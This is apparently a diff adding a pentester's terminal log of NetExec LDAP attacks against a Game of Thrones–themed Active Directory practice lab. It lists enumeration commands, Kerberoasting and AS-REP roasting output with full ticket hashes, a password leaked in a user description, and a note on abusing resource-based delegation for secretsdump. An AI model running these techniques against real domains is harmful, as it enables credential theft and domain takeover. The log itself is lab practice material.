@@ -1,0 +1,238 @@
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M groupmembership -o USER=jon.snow
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+GROUPMEM... 192.168.56.11   389    WINTERFELL       [+] User: jon.snow is member of following groups:
+GROUPMEM... 192.168.56.11   389    WINTERFELL       Night Watch
+GROUPMEM... 192.168.56.11   389    WINTERFELL       Stark
+GROUPMEM... 192.168.56.11   389    WINTERFELL       Domain Users
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M groupmembership -o USER=hodor
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+GROUPMEM... 192.168.56.11   389    WINTERFELL       [+] User: hodor is member of following groups:
+GROUPMEM... 192.168.56.11   389    WINTERFELL       Stark
+GROUPMEM... 192.168.56.11   389    WINTERFELL       Domain Users
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M whoami
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+WHOAMI      192.168.56.11   389    WINTERFELL       Name: hodor
+WHOAMI      192.168.56.11   389    WINTERFELL       Description: Brainless Giant
+WHOAMI      192.168.56.11   389    WINTERFELL       sAMAccountName: hodor
+WHOAMI      192.168.56.11   389    WINTERFELL       Enabled: Yes
+WHOAMI      192.168.56.11   389    WINTERFELL       Password Never Expires: Yes
+WHOAMI      192.168.56.11   389    WINTERFELL       Last logon: 2025-06-28 23:10:41 UTC
+WHOAMI      192.168.56.11   389    WINTERFELL       Password Last Set: 2024-01-13 12:44:47 UTC
+WHOAMI      192.168.56.11   389    WINTERFELL       Bad Passwod Count: 0
+WHOAMI      192.168.56.11   389    WINTERFELL       Distinguished Name: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local
+WHOAMI      192.168.56.11   389    WINTERFELL       Member of: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
+WHOAMI      192.168.56.11   389    WINTERFELL       User SID: S-1-5-21-596478359-855482507-394124661-1117
+
+#----- nxc ldap 192.168.56.11  -u hodor -p 'hodor' --admin-count
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       Administrator
+LDAP        192.168.56.11   389    WINTERFELL       vagrant
+LDAP        192.168.56.11   389    WINTERFELL       krbtgt
+LDAP        192.168.56.11   389    WINTERFELL       eddard.stark
+LDAP        192.168.56.11   389    WINTERFELL       catelyn.stark
+LDAP        192.168.56.11   389    WINTERFELL       robb.stark
+
+#----- nxc ldap 192.168.56.11  -u hodor -p 'hodor' --kerberoasting kerb.txt
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       [*] Skipping disabled account: krbtgt
+LDAP        192.168.56.11   389    WINTERFELL       [*] Total of records returned 3
+LDAP        192.168.56.11   389    WINTERFELL       [*] sAMAccountName: jon.snow, memberOf: ['CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local', 'CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local'], pwdLastSet: 2024-01-13 07:44:51.515690, lastLogon: <never>
+LDAP        192.168.56.11   389    WINTERFELL       $krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local\jon.snow*$8985e6b28aceabeab89619985b4d7ce9$0d21820d5a8f9f3aa8297f47298ebbd11631b9b37104793ead84cabb975b88aaea2abac0d30f8718f7165791f700d33aa51f2dade4cb6d1e1cbf6d9d5769c572b4a7e092c08b6ed15a49dd96aeff5f5466ec27e508bfd373281dd98d460b963a18531686599ef196068e9fb939654b19f534677c3d36567f381d6ef24d04516cba0adc31ac150902874dedc3ef92b1e1e02cb0a1bcc064a042f382c1d6a0192f9f2a84fd8eb4aab2cd20ec380380321d024e11280ae731a02b0c163c4f26bca3c3dea7c9be81d4fe5b3f3154301c1cf68b8efd5e3782a460942b870317b9d62ea03ea78ff02fef7bfa24ff64b3b53a94b806b1c4fade40a2bfb9510ce93adad9d866c41a3633b78400789d7877bcf27b67ebec28f91d17a32dede9cd733326d4b0084a5aca04bf5419e4e94440f6d9b373bfcf638e2d21ffbcdd295fdb8c1073f534ad220f044e9d026ae12f5dda130897a4a9b3b8967473ecda57b1dec7bb73c83b814d48e886b44c43c23c7c1dde11e34ca8d1de16e28615ba7f7206d0887b44fd65eb51a291afdf5c1891fae1e374660a21c8b2c62ecf77381b459eedd98470b831223978647f59b649adc9a9e5f0efd4877eca70f79d20c83e1623eed0a8ba78d2bee50305881f68191287e05f81f3d03ddb1f2f22674a0c0b0bf28b8053c94a535d87c7d2b3288be7119823dbd02b975b2afc67c2f33092bb66ca0e7b67d846a0ab0a42bcfd8520b21e07a376e95f28cec6f6ad12c82ffb17722a8fce84c7c148442a49044e9c32f1815aafcca6fb194bb4768bd190b0806ffc779dcba0fad95f693fbc8f9d4e28e8f1fbba865b31208dd1b1cded6710bc744465095ed13a42074aeab0281658a8507608efcf1ced951704d557c30c8ef3626948a29279363a333c0e992e65d58046bf7f6ab420281e577cb0dc8b42b52c3cbbdb13de0d48748a0b7f69f0e5fdad2ae9912af6a9cf7888ca3abdaae246fad9f581fdb35fb9dc5b313261e928fe021bb33efac56d51e858c0d9c297796033c6a15d7b2df53d422977769488982145262a6a7d4a73197aa3d1beb1d10de47c5f55b01636da50ca8a99583dcdb0602d82d9dd60612884bdf9ab5f6970d2e7180763f5064f841def19088ef09d413c449b7d063a41f62b7324631fef1233f768b2b7a3cadfa68948ad170351f13296760b6fcc34c61e3026494a6d6b119a0021b6503a10a474bbb8a680e403236807a1805097e25d0a5a7090abf7b53e586874312d93daffa486cd9abf054b22e516e10a86df06bf2ae64790c11b2672cc84b96b3e939ce75e8d761d24b64c1a82539d976cdaf3a1bc918c13f4aaf1a55dadd8083828fe84907bc8da64d29a374e2eef46e43181dc1845f05d75f8db8df7d7dca43dbedec16b696df9b2237e5367f3ab5ea3f4a96866719310e5af934e
+LDAP        192.168.56.11   389    WINTERFELL       [*] sAMAccountName: sansa.stark, memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local, pwdLastSet: 2024-01-13 07:44:35.971637, lastLogon: <never>
+LDAP        192.168.56.11   389    WINTERFELL       $krb5tgs$23$*sansa.stark$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local\sansa.stark*$5ccf2ad3d4af87be8d6435e746e0563d$3a346188b1f22b0af2ee94e0a0d9844e6a24a678160a830da7ee63b6aa0a2b80d8f3b4126123152518deab7741f86ec1addd943e77911c6ad9e6b6c71b56071fd963abac45d6d723d66547a15539b968b4af7ec63525c4ff1338c4d9c08090bc592ac317959e81756b0ed81077a22f6798e62d3630b7889e5495e5930996fb92e685583951088473cfa6e03f8fa57cc3a16f1a426c8fcae09f69c54d228f5346126e917d67034d4bf42beb38b0fecb99d714465dcb14307e8e49fafdc64c4f7527aae12bc945bde1e6ca6f0b139e34d60cdd9a449975d2ae89fc98d94d7fee008c362a65a1cdefadda84ee90315f0c77f878ee3ce21930caa93d40cc78d51f292a30903394df33d447ed3241495db6551e979cbfb9a7c97b263cb03146ef248e7df706afcb325f0e92a833a1c88fc8f242095632ae0a5e8c70589a1d4c1d0737649d12c65233d73a72d80e9c2637b4d3ce6b0dd588f9e58531782eaebf32ad37ec4966907d448141414f65c7e09acc02b1b5afefa6a7bceac6fe1cda3fe39dc2a51648744f2ff8356c4dd1bbfc54b269ef75ae1dfc7f164017936465b3b2a1c011093f40d4c5c6519dbed87eb5e786100cb010b8a332629d0e3efa9148f78e87bc5556fc826d02ed9427cdc61c2aafcf2beda98c51eebab8f7580e0783f64e10094625ea67a53f6ec2d735fc38872f98b1be8ca3561978f45d7a44354a5f0d068875a3a50eee05ba0c715bc1fb7e7451bfa4434766460de3eb50b8a0b370358c95a8d83b154870fd0f98c120cccdd11c8068d885d29a7539d8f06e170eb5779a7de15df05056f8a7a33f4d4c800d5b52ee932d2359a3978e41b7823476abb2042d257135d2a2181be8e3e831498b312fae815bb48019b042455f480e1e577774b75d069aeb4cd84d7bd3c8303eae7d22b4006285c78148b3535d71891af273b4823790441b81d0e6e809bc145e159f2434bf4bdd1af9edcbf1a24f638971b3f962b46477b563ec08a3ec34fcca41ddefbacb00f732384f2fd5edf8e4220426d2863324b0e802b5046589a61d5b41f95c4f217dff22cbc98229e6ec8cb285d234797d2f7d1fd46686f14ed3fced1b3d9cd014173b08f64af67a19fd1f99429e9a9be4cc7ed069f53f37ee9cdee5236c71cfd57411d5bd83400905ad4a1ecbec4b816c645ef7b1566446317eb3554aeb3315db6515fbb138f08991c8d36afb1477e1274a3c0c3a0029524527e5bf5b3749af027ea01ff76560e8fe69ce63a8692ba454d0b4cdff34ee0b817cb9e4d3b6dd255144997025a54bc4043992629d3e05e911ce23f9d0a435c457dd349a9b5b89bc9e44b3cb134101fd579427150d117101614f995f1ef61692d54f0eca42f6cc53991e821d3fd4b5555ad32d5aef769abd86305b4695185d55dd4042c86a30d67514f850799242
+LDAP        192.168.56.11   389    WINTERFELL       [*] sAMAccountName: sql_svc, memberOf: [], pwdLastSet: 2024-01-13 07:45:03.438051, lastLogon: 2025-06-17 16:40:41.394867
+LDAP        192.168.56.11   389    WINTERFELL       $krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local\sql_svc*$e3ad0b7842cf09ddbcd70635708e9dea$09d02c89527c31f255fdb751bd46b722b059da455d5f18f5e60b88af9225023856763bd4ff1ae76407f97dd0fcdbc1966ffe682dca0e515e03571ccd43c678009c8615685cf3cdbb7a6a04f9718b09fb909601a57f61592cc33da6ef8b1a88471f032375c7e6d26cae72f2d96c0572c9d6afda53dab046ece840ba3129832cd80e18ad640e130933e9618fec62fff2c8a1b3d45e3fbbe490dd61d5893b321fd6b5422b511d8ca6112d9762e5686cf3c46bd118c01ded5c24d131cc45c848e6eb6d4da94008df8c1cf358f48f6bceab172c9395865417f9fa69a0e7ba000c30a8022fd80822d21295921eeadbb3adafa20efe937c7bb6365dfdbbc1b7eda91866ba7a9b76283c3bd05aaf4600277125f064b89deae03a6d28b2cb5a1325e9e926a603f5af736b1a80c5ca0f1dd021da1b7b8bb12cbd57580c19d0a4d59ccfb15975572e8e0b7a299194f25ab329ac53f0f0d9fc4322c1a6b377966d497cab4eab6c536ecd5eb94723d945e1edb095544410ffed2db9d8395a018796ccdbdc9b6a0c531b14b148400439d74ed6012d517770a4e7102407b3927bade5383f36593d0a5d8bd80577f1a89a36aa016cb27cac30c87fe8af574275d673b752a2ee2b6eab1316690809b3cfb6f4a8463af15814e86867de81eacba479764c7ad37151c82ed748b4e598e97fec8a416ab093c3d4bcebb961b8b13eea7a5929f1c36376c1105d6822e45f23009e6dd7c9f607cac5529c729cb9be8e7fe3b80cc3bacaa426e2170e7b6500349a8f8c25c82230731596a078d73fc648dc43329b189bbffa4994fe6d71324c107006fa89b440da06c03e14d16ec986388eca94ef885037d6414051f8525dbca437c8ef25a1b2ace1eb908a12b38318c611d3889e87f728775c7918082edf59d1a60c4ac2a0e9c63600475b4c99cd6e5e00fbb07ef912e0bb708667f9143f3ec82833a286312f26cfdc9885ec62201aafc6500bf46c6eba29789c0ac09ef5675ec0904071c25fccebc908e296244aeaee35a6bc0cc093a86217e7273a4ac1bcccbb1ce483ddc073205659e774d0f960f97e596ab9eea2c9652974f40de3b7aeff2ecbf831cef00f9eb3d42c5d94366485756c57def5acd967371d5297f5659efb4cefcb360bc2f23de7606fbb6a93baa3e7e98fd8a82ae18616a6da58785859cc05c851cc02961366e4c92432154748efffdcdbe08682a84d9342661155a5ba78e251c1f8817faeb167e17471acfa2db76e434daba67a9b0f9646af840e91b5a215dc14bf652f0e174efc3056fd8ff9538ac07f09e93a31e50b8c43043cbf932f495c1822d7c8f21635a61b0e45c9efc2474279e5e1fa2fedacefcc5d7808d6c095991bc91edef628a8575da93d6e180c2b161ef095aa5660716bf470c39a483a6e4dcff167277ab4c346c0026e6412d6
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' --asreproast asp.txt
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       [*] Total of records returned 1
+LDAP        192.168.56.11   389    WINTERFELL       $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ba3c6aa8343682e0783595070ba89581$c3f60f7e38d6d2ba57fb1b219f512363e984b20e1c5ca655d57be8f5f6a4e7bf2f2c8030b88b2ddc38a2171a585263a77f0963e75a0ed139697d360fd8aefab47bc142310abc5e1f340c641243a8eb282e67ff27b42f96dcafda43ed3477a21b388158295fc3766a8d578b707b98ef8891336dcb5ad92905e3560eb6da45bfccc97c0a342474520e04c1a05e0843805bc59237dc5de98401e1d0a704e10d2fb6e156c1a16891bfd33c501116b1e5b0b23418b9e0aea5c7af4bc16c92d3c61fc6db6a831449926a8910eb481769753eaaf660aff1f9742adf9f7d02c2f62b3067466436bbc8b10b08cc407b51712ae36ba6cbaf1e76508abdad8d0ceca8d8e49c6ac1161bd0c6
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' --trusted-for-delegation
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       WINTERFELL$
+LDAP        192.168.56.11   389    WINTERFELL       sansa.stark
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' --password-not-required
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       User: SEVENKINGDOMS$ Status: enabled
+LDAP        192.168.56.11   389    WINTERFELL       User: Guest Status: disabled
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' --computers
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       [*] Total records returned: 2
+LDAP        192.168.56.11   389    WINTERFELL       WINTERFELL$
+LDAP        192.168.56.11   389    WINTERFELL       CASTELBLACK$
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' --dc-list
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       winterfell.north.sevenkingdoms.local = 192.168.56.11
+LDAP        192.168.56.11   389    WINTERFELL       [+] Found DC in trusted domain: kingslanding.sevenkingdoms.local
+LDAP        192.168.56.11   389    WINTERFELL       sevenkingdoms.local -> Bidirectional -> Within Forest
+LDAP        192.168.56.11   389    WINTERFELL       kingslanding.sevenkingdoms.local = 192.168.56.10
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' --gmsa
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       [*] Getting GMSA Passwords
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' --find-delegation
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       AccountName  AccountType DelegationType                     DelegationRightsTo
+LDAP        192.168.56.11   389    WINTERFELL       ------------ ----------- ---------------------------------- ----------------------------------------------------------------
+LDAP        192.168.56.11   389    WINTERFELL       sansa.stark  Person      Unconstrained                      N/A
+LDAP        192.168.56.11   389    WINTERFELL       jon.snow     Person      Constrained w/ Protocol Transition CIFS/winterfell, CIFS/winterfell.north.sevenkingdoms.local
+LDAP        192.168.56.11   389    WINTERFELL       CASTELBLACK$ Computer    Constrained                        HTTP/winterfell, HTTP/winterfell.north.sevenkingdoms.local
+
+#----- nxc ldap 192.168.88.142  -u alfred -p 'P@ssw0rd' --find-delegation
+LDAP        192.168.88.142  389    DC09             [*] Windows 10 / Server 2019 Build 17763 (name:DC09) (domain:gotham.local)
+LDAP        192.168.88.142  389    DC09             [+] gotham.local\alfred:P@ssw0rd
+LDAP        192.168.88.142  389    DC09             AccountName AccountType DelegationType             DelegationRightsTo
+LDAP        192.168.88.142  389    DC09             ----------- ----------- -------------------------- ------------------
+LDAP        192.168.88.142  389    DC09             lucius      Person      Unconstrained              N/A
+LDAP        192.168.88.142  389    DC09             DC09$       Computer    Resource-Based Constrained ARKHAM$
+LDAP        192.168.88.142  389    DC09             ARKHAM$     Computer    Constrained                TERMSRV/dc09
+
+----
+because arkham id RBCD to DC09 impacket-secrectdump from arkham will be allowed
+----
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' --dns-server 192.168.56.11 --bloodhound -c All
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+LDAP        192.168.56.11   389    WINTERFELL       Resolved collection methods: group, container, localadmin, dcom, acl, rdp, psremote, trusts, objectprops, session
+[19:15:39] ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+[19:15:40] ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+[19:15:41] ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+           ERROR    Could not find a Global Catalog in this domain! Resolving will be unreliable in forests with multiple domains                                                        domain.py:90
+LDAP        192.168.56.11   389    WINTERFELL       Done in 0M 1S
+LDAP        192.168.56.11   389    WINTERFELL       Compressing output into /home/kali/.nxc/logs/WINTERFELL_192.168.56.11_2025-06-28_191539_bloodhound.zip
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M adcs
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+ADCS        192.168.56.11   389    WINTERFELL       [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
+ADCS        192.168.56.11   389    WINTERFELL       [-] No ADCS infrastructure found.
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M badsuccessor
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+BADSUCCE... 192.168.56.11   389    WINTERFELL       [-] No domain controller with operating system Windows Server 2025 found, attack not possible. Enumerate dMSA objects anyway.
+BADSUCCE... 192.168.56.11   389    WINTERFELL       [+] Found 1 results
+BADSUCCE... 192.168.56.11   389    WINTERFELL       S-1-5-21-4034023093-2762773782-3587924277-519, OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M get-desc-users
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+GET-DESC... 192.168.56.11   389    WINTERFELL       [+] Found following users:
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: Administrator description: Built-in account for administering the computer/domain
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: Guest description: Built-in account for guest access to the computer/domain
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: vagrant description: Vagrant User
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: krbtgt description: Key Distribution Center Service Account
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: arya.stark description: Arya Stark
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: eddard.stark description: Eddard Stark
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: catelyn.stark description: Catelyn Stark
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: robb.stark description: Robb Stark
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: sansa.stark description: Sansa Stark
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: brandon.stark description: Brandon Stark
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: rickon.stark description: Rickon Stark
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: hodor description: Brainless Giant
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: jon.snow description: Jon Snow
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: samwell.tarly description: Samwell Tarly (Password : Heartsbane)
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: jeor.mormont description: Jeor Mormont
+GET-DESC... 192.168.56.11   389    WINTERFELL       User: sql_svc description: sql service
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M user-desc
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+USER-DESC   192.168.56.11   389    WINTERFELL       User: krbtgt - Description: Key Distribution Center Service Account
+USER-DESC   192.168.56.11   389    WINTERFELL       User: samwell.tarly - Description: Samwell Tarly (Password : Heartsbane)
+USER-DESC   192.168.56.11   389    WINTERFELL       Saved 16 user descriptions to /home/kali/.nxc/UserDesc-winterfell.north.sevenkingdoms.local-20250628_193902.log
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M get-network
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+GET-NETWORK 192.168.56.11   389    WINTERFELL       [*] Querying zone for records
+GET-NETWORK 192.168.56.11   389    WINTERFELL       Found 3 records
+GET-NETWORK 192.168.56.11   389    WINTERFELL       [+] Dumped 3 records to /home/kali/.nxc/logs/north.sevenkingdoms.local_network_2025-06-28_192016.log
+GET-NETWORK 192.168.56.11   389    WINTERFELL       [*] To extract CIDR from the 3 ip, run  the following command: cat your_file | mapcidr -aa -silent | mapcidr -a -silent
+
+└─$ cat /home/kali/.nxc/logs/north.sevenkingdoms.local_network_2025-06-28_192016.log
+192.168.56.11
+192.168.56.22
+192.168.56.11
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M find-computer -o TEXT=2016
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+FIND-COM... 192.168.56.11   389    WINTERFELL       [+] Unable to find any computers with the text 2016
+
+└─$ nxc ldap 192.168.56.11  -u hodor -p 'hodor' -M find-computer -o TEXT=2019
+/home/kali/.local/pipx/venvs/netexec/lib/python3.11/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import resource_filename
+LDAP        192.168.56.11   389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never)
+LDAP        192.168.56.11   389    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
+FIND-COM... 192.168.56.11   389    WINTERFELL       [+] Found the following computers:
